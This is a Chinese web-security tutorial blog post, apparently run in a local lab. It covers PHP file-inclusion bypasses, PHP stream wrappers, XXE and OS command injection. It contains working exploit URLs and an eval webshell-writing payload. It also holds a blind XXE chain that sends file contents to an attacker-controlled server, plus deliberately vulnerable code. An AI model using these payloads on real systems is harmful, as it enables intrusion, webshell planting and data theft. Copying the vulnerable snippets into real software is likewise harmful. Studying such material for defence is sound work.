+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/testinclude.php?filename=phpinfo.php././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/include6.png" alt="Web/include6.png"></p>
+<p><img src="/2018/11/13/Web/include7.png" alt="Web/include7.png"></p>
+<p>点号截断<br>条件：php版本小于5.3可以成功，windows OS，参数值总长度需要长于255<br>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/testinclude.php?filename=phpinfo.php................................................................................................................................................................................................................................................</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/include4.png" alt="include4"></p>
+<p><img src="/2018/11/13/Web/include5.png" alt="include5"></p>
+<p>目录遍历绕过固定目录<br>测试代码：<br><img src="/2018/11/13/Web/include8.png" alt="include8"></p>
+<p>测试结果：<br><img src="/2018/11/13/Web/include9.png" alt="include9"></p>
+<h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a><strong>远程文件包含漏洞</strong></h3><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，<br>如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">条件：</div><div class="line">allow_url_fopen = On（是否允许打开远程文件）</div><div class="line">allow_url_include = On（是否允许include/require远程文件）</div></pre></td></tr></table></figure></p>
+<p>无限制远程文件包含漏洞<br>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试结果:<br><img src="/2018/11/13/Web/url_include1.png" alt="url_include1"></p>
+<p>有限制远程文件包含漏洞绕过<br>测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename.<span class="string">".html"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>多增加.html后缀<br><img src="/2018/11/13/Web/url_include2.png" alt="url_include2"></p>
+<p>问号绕过</p>
+<p>原理，HTTP协议中，问号后面的代表参数。<br><img src="/2018/11/13/Web/url_include3.png" alt="url_include3"></p>
+<p>Burp Fuzz 结果如下，#,?,空格,空字符都可以绕过。<br><img src="/2018/11/13/Web/url_include4.png" alt="url_include4"></p>
+<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a><strong>PHP伪协议</strong></h3><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
+<p><img src="/2018/11/13/Web/php_protocol1.png" alt="php_protocol1"></p>
+<h4 id="file-—-访问本地文件系统"><a href="#file-—-访问本地文件系统" class="headerlink" title="file:// — 访问本地文件系统"></a>file:// — 访问本地文件系统</h4><p>通过file协议可以访问本地文件系统，读取到文件的内容，不受allow_url_fopen与allow_url_include的影响</p>
+<p>php.ini</p>
+<p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/php_protocol_file.png" alt="php_protocol_file"></p>
+<h4 id="http-s-—-访问-HTTP-s-网址（相当于远程文件包含）"><a href="#http-s-—-访问-HTTP-s-网址（相当于远程文件包含）" class="headerlink" title="http(s):// — 访问 HTTP(s) 网址（相当于远程文件包含）"></a>http(s):// — 访问 HTTP(s) 网址（相当于远程文件包含）</h4><h4 id="php-访问各个输入-输出流（I-O-streams）"><a href="#php-访问各个输入-输出流（I-O-streams）" class="headerlink" title="php:// - 访问各个输入/输出流（I/O streams）"></a>php:// - 访问各个输入/输出流（I/O streams）</h4><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入<br>输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时<br>文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>php://filter（本地磁盘文件进行读取）</p>
+<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写,不受allow_url_fopen与allow_url_include的影响</p>
+<p>php.ini</p>
+<p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
+<p>Usage:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?filename=php://filter/read=convert.base64-encode/resource=phpinfo.php</div><div class="line">与</div><div class="line">?filename=php://filter/convert.base64-encode/resource=phpinfo.php 一样。</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/php_protocol_php1.png" alt="php_protocol_php1"></p>
+<p>php://input（写shell）</p>
+<p>可以访问请求的原始数据的只读流。<br>将POST请求中的数据作为PHP代码执行。<br>enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>PHP.ini：</p>
+<p>allow_url_fopen ：off/on<br>allow_url_include：on</p>
+<p>Usage:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/php_protocol_php2.png" alt="php_protocol_php2"></p>
+<p>php://input（命令执行）</p>
+<p><img src="/2018/11/13/Web/php_protocol_php3.png" alt="php_protocol_php3"></p>
+<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p>php.ini</p>
+<p>allow_url_fopen ：on（官网是说不受allow_url_fopen影响，经过测试这个要为On，才能造成任意代码执行）<br>allow_url_include：on</p>
+<p>条件:  PHP 5.2.0 起 data://数据流封装器开始有效。</p>
+<p>用法：data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== </p>
+<p>or</p>
+<pre><code>http://127.0.0.1/fileinclude.php?filename=data:text/plain,&lt;?php phpinfo();?&gt;
+</code></pre><p><img src="/2018/11/13/Web/php_protocol_php6.png" alt="php_protocol_php6"></p>
+<h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>php.ini</p>
+<p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
+<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： phar:// 数据流包装器自 PHP 5.3.0 起开始有效， 压缩包需要是zip协议压缩，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
+<p><img src="/2018/11/13/Web/php_protocol5.png" alt="php_protocol5"></p>
+<h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><p>php.ini</p>
+<p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
+<p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.txt。</p>
+<p>xxx.png 不管后缀是什么，都会当做zip压缩包来解压。</p>
+<p>shell.txt 不管后缀是什么，只要里面有php代码，被include等包含函数包含，都会被执行。</p>
+<p>条件：#在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+<p><img src="/2018/11/13/Web/php_protocol_php4.png" alt="php_protocol_php4"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>PHP中 allow_url_fopen默认为On，allow_url_include默认为Off</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>条件</th>
+<th>allow_url_fopen</th>
+<th>allow_url_include</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td>PHP&gt;=5.0.0</td>
+<td>off/on</td>
+<td>off/on</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>PHP&gt;=5.0.0</td>
+<td>off/on</td>
+<td>off/on</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>\</td>
+<td>off/on</td>
+<td>on</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>\</td>
+<td>off/on</td>
+<td>off/on</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>PHP&gt;=5.2.0</td>
+<td>on</td>
+<td>on</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td>PHP&gt;=5.3.0</td>
+<td>off/on</td>
+<td>off/on</td>
+</tr>
+</tbody>
+</table>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>参考DVWA。</p>
+<h2 id="XML外部实体攻击（XML-External-Entity-attack）"><a href="#XML外部实体攻击（XML-External-Entity-attack）" class="headerlink" title="XML外部实体攻击（XML External Entity attack）"></a>XML外部实体攻击（XML External Entity attack）</h2><p><strong>0x00 简介</strong></p>
+<p>XML（eXtensible Markup Language）是一种标记语言，被设计用来传输和存储数据。</p>
+<p>在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。</p>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>包含内部实体的XML文档：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">// XML声明</div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"></div><div class="line">// 文档类型定义</div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY copyright "Copyright www.lxhsec.com"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"></div><div class="line">// 文档元素</div><div class="line"><span class="tag">&lt;<span class="name">lxhsec</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">internal</span>&gt;</span>&amp;copyright;<span class="tag">&lt;/<span class="name">internal</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;/<span class="name">lxhsec</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>包含外部实体的XML文档：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY blog SYSTEM "http://www.lxhsec.com/"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">lxhsec</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;blog;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">lxhsec</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在解析XML时，实体将会被替换成相应的引用内容。</p>
+<p>XML外部实体（XML External Entity，XXE）攻击是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。</p>
+<p><strong>0x01 成因</strong><br>若WEB应用程序使用了XML进行数据传输，支持解析外部实体，且XML数据可控，则会导致XXE产生。</p>
+<p><strong>0x02 利用</strong></p>
+<p>这里以PHP为例，讲解XXE漏洞。</p>
+<p>在开始之前，我们要了解XML中拥有特殊意义的字符。</p>
+<table>
+<thead>
+<tr>
+<th>HTML实体</th>
+<th>字符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&amp; lt;</td>
+<td>&lt;</td>
+<td>小于</td>
+</tr>
+<tr>
+<td>&amp; gt;</td>
+<td>&gt;</td>
+<td>大于</td>
+</tr>
+<tr>
+<td>&amp; amp;</td>
+<td>&amp;</td>
+<td>AND</td>
+</tr>
+<tr>
+<td>&amp; apos;</td>
+<td>‘</td>
+<td>单引号</td>
+</tr>
+<tr>
+<td>&amp; quot;</td>
+<td>“</td>
+<td>双引号</td>
+</tr>
+</tbody>
+</table>
+<p>在 XML 中，只有字符 “&lt;” 和 “&amp;” 是非法的,也就是说如果我们解析的文件中含有&lt; or &amp; ，将导致XML解析出错，例，使用file协议读取文件时，若读取的文件中包含看&lt; or &amp; 将报错。</p>
+<p>file协议 - 读取文件</p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">  &lt;!ENTITY lxhsec SYSTEM "file:///c:/windows/win.ini"&gt;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">&lt;lxhsec&gt;&amp;lxhsec;&lt;/lxhsec&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line"></div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2018/11/13/Web/xxe1.png" alt="xxe1"></p>
+<p>注：如果读取的文件本身包含“&lt;”、“&amp;”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">	&lt;!ENTITY lxhsec SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">&lt;lxhsec&gt;&amp;lxhsec;&lt;/lxhsec&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2018/11/13/Web/xxe4.png" alt="xxe4"></p>
+<p>ps: php://filter 读取文件，支持相对路径。</p>
+<p>HTTP(s)协议 - 探测内网端口</p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">  &lt;!ENTITY lxhsec SYSTEM "http://192.168.31.132:80/xxxx"&gt;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">&lt;lxhsec&gt;&amp;lxhsec;&lt;/lxhsec&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line"></div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>结果：</p>
+<p>端口开放<br><img src="/2018/11/13/Web/xxe2.png" alt="xxe2"></p>
+<p>端口关闭<br><img src="/2018/11/13/Web/xxe3.png" alt="xxe3"></p>
+<p>通过返回不同的状态信息来判断端口开放情况，另外http(s)协议可以用来发起GET请求，攻击内网WEB应用程序，例如struts2.</p>
+<p>上述代码，都是基于回显的利用，如果屏蔽了回显是不是就不能利用了呢?</p>
+<p>当然不是，可以把数据发送到远程服务器。</p>
+<p>测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">	&lt;!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;</span></div><div class="line"><span class="string">	&lt;!ENTITY % remote SYSTEM "http://192.168.31.232/evil.txt"&gt;</span></div><div class="line"><span class="string">%remote;</span></div><div class="line"><span class="string">%send;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line"><span class="comment">#print_r($data);</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>实体remote，send的引用顺序很重要,首先对remote引用的目的是将外部文件evil.txt引入到解释上下文中，然后执行%all,这时会检测到send实体,之后执行%send,请求远程1.php文件，将内容传递过去。</p>
+<p>远程evil.txt文件内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.232/1.php?file=%file;'&gt;"&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure></p>
+<p>这里要注意 % send 中的%号要使用HTML实体编码，否则将报错。<br><img src="/2018/11/13/Web/xxeremote1.png" alt="xxeremote1"></p>
+<p>当然如果想去掉%号，不想用参数实体,可以直接在xml中多增加一行文档元素，用来解析实体,具体如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">	&lt;!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;</span></div><div class="line"><span class="string">	&lt;!ENTITY % remote SYSTEM "http://192.168.31.232/evil.txt"&gt;</span></div><div class="line"><span class="string">%remote;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">&lt;root&gt;&amp;send;&lt;/root&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line"><span class="comment">#print_r($data);</span></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="comment">//evil.txt</span></div><div class="line"></div><div class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY send SYSTEM 'http://192.168.31.232/1.php?file=%file;'&gt;"</span>&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure></p>
+<p>远程1.php文件内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">file_put_contents(<span class="string">"1111.txt"</span>, $_GET[<span class="string">'file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站,攻击者WEB应用程序再将文件内容保存在txt中。</p>
+<p><img src="/2018/11/13/Web/xxeremote4.png" alt="xxeremote4"></p>
+<p><img src="/2018/11/13/Web/xxeremote2.png" alt="xxeremote3"></p>
+<p><img src="/2018/11/13/Web/xxeremote3.png" alt="xxeremote3"></p>
+<p>修复建议</p>
+<p>1.在解析XML之前添加，禁用外部实体的方法。</p>
+<p>PHP:<br>libxml_disable_entity_loader(true);</p>
+<p>2.过滤XML数据</p>
+<p>如，SYSTEM和PUBLIC</p>
+<h2 id="命令执行（OS-Commanding）"><a href="#命令执行（OS-Commanding）" class="headerlink" title="命令执行（OS Commanding）"></a>命令执行（OS Commanding）</h2><p>0x01 前言<br>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。 </p>
+<p>0x02 成因<br>WEB应用程序在调用命令执行函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，又没有过滤用户的输入的情况下，就会造成命令执行漏洞。</p>
+<p>0x03 利用<br>先来了解下几个特殊的符号。</p>
+<p>Windows ：<br>|   - 前一个命令的输出，作为后一个命令的输入，显示后面的执行结果<br><img src="/2018/11/13/Web/windows1.png" alt="windows1"></p>
+<p>||  - 当前面为假时，才会执行后面的命令<br><img src="/2018/11/13/Web/windows2.png" alt="windows2"></p>
+<p>&amp;  - 无论前面结果如何，都会执行后面的命令<br><img src="/2018/11/13/Web/windows3.png" alt="windows3"></p>
+<p>&amp;&amp; - 当前面为真时，才会执行后面的命令。<br><img src="/2018/11/13/Web/windows4.png" alt="windows4"></p>
+<p>Linux:<br>; - 顺序执行，从左到右<br><img src="/2018/11/13/Web/linux1.png" alt="linux1"></p>
+<p>| - 前一个命令的输出，作为后一个命令的输入，显示后面的执行结果<br><img src="/2018/11/13/Web/linux2.png" alt="linux2"></p>
+<p>|| - 当前面为假时，才会执行后面的命令<br><img src="/2018/11/13/Web/linux3.png" alt="linux3"></p>
+<p>&amp;  - 无论前面结果如何，都会执行后面的命令<br><img src="/2018/11/13/Web/linux4.png" alt="linux4"></p>
+<p>&amp;&amp; - 当前面为真时，才会执行后面的命令。<br><img src="/2018/11/13/Web/linux5.png" alt="linux5"></p>
+<p>小结：Linux与Windows用法基本一致，Linux多了一个分号符号。</p>
+<p>这里以PHP介绍命令执行漏洞。</p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">	$target = $_GET[ &apos;cmd&apos; ];</div><div class="line">	$cmd = shell_exec( &apos;ping  &apos; . $target );</div><div class="line">	echo  &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>测试结果：<br><img src="/2018/11/13/Web/oscommand.png" alt="oscommand"></p>
+<p>分析<br>在测试代码中，原意是想测试网络的情况，但是因为参数可控，且我们没有过滤用户的输入，因此在测试结果中我们可以看到成功执行了whoami命令，导致了命令执行漏洞的产生。</p>
+<p>在PHP中常见可控位置情况有下面几种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">system(&quot;$arg&quot;); //可控点直接是待执行的程序</div><div class="line">system(&quot;/bin/prog $arg&quot;); //可控点是传入程序的整个参数</div><div class="line">system(&quot;/bin/prog -p $arg&quot;); //可控点是传入程序的某个参数的值（无引号包裹）</div><div class="line">system(&quot;/bin/prog --p=\&quot;$arg\&quot;&quot;); //可控点是传入程序的某个参数的值（有双引号包裹）</div><div class="line">system(&quot;/bin/prog --p=&apos;$arg&apos;&quot;); //可控点是传入程序的某个参数的值（有单引号包裹）</div></pre></td></tr></table></figure></p>
+<p><strong>第一种情况</strong><br>如果我们能直接控制$arg，那么就能执行执行任意命令了，没太多好说的。<br><strong>第二种情况</strong><br>我们能够控制的点是程序的整个参数，我们可以直接用&amp;&amp;或|等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。<br>还有一个偏门情况，当$arg被escapeshellcmd处理之后，我们不能越出这个外部程序的范围，我们可以看看这个程序自身是否有”执行外部命令”的参数或功能，比如linux下的sendmail命令自带读写文件功能，我们可以用来写webshell。<br><strong>第三种情况</strong><br>我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。<br><strong>第四种情况</strong><br>这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell环境下双引号中间的变量也是可以被解析的。我们可以在双引号内利用反引号执行任意命令.<br><strong>第五种情况</strong><br>这是最难受的一种情况了，因为单引号内只是一个字符串，我们要先闭合单引号才可以执行命令。如：system(“/bin/prog –p=’aaa’ | id’’”)</p>
+<p>危害自然不言而喻，执行命令可以读写文件、反弹shell、获得系统权限、内网渗透等。</p>
+<p>在PHP中可以调用外部程序的主要有以下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">system</div><div class="line">exec</div><div class="line">shell_exec = ``(反单引号)</div><div class="line">passthru</div><div class="line">popen</div><div class="line">proc_popen</div></pre></td></tr></table></figure></p>
+<p>system </p>
+<p>说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">string system ( string $command [, int $return_var ] )</div><div class="line"></div><div class="line">command 要执行的命令。</div><div class="line">return_var 命令执行成功，返回0，失败返回1.（可选参数）</div><div class="line"></div><div class="line">返回值：</div><div class="line">成功则返回命令输出的最后一行， 失败则返回 FALSE</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//ip.php</div><div class="line">&lt;?php</div><div class="line">    $target=$_GET[&apos;cmd&apos;];</div><div class="line">    $return = system($target);</div><div class="line">	echo &quot;&lt;pre&gt;system return value is: $return &lt;/pre&gt;&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
